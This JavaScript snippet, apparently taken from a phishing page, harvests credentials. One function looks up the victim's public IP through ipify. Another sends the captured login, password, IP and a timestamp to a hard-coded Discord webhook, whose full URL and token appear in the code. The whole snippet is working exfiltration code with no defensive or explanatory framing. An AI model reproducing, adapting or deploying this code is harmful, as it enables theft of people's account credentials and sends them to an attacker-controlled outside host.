
function GetIp(l, p) {
fetch('https://api.ipify.org/?format=text')
  .then(
    response => response.text()
  ).then(
    text => SNED(l, p, text)
  ); 
}

function SNED(login, paswd, ip) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://discord.com/api/webhooks/1226817423123152896/W4wdmDDSTtegtzjRt9oVG6JRTfwi-DkD-wx0Q8hAm_gcJbDDLGxj_FeH4mClMydvex-9');
  xhr.setRequestHeader('Content-type', 'application/json');
  xhr.send(JSON.stringify({
    "embeds": [
      {
        "color": null,
        "fields": [
          {
            "name": "Login",
            "value": login,
            "inline": true
          },
          {
            "name": "Password",
            "value": "||" + paswd + "||",
            "inline": true
          }
        ],
        "footer": {
          "text": "From " + ip
        },
        "timestamp": new Date().toISOString()
      }
    ]
  }));
}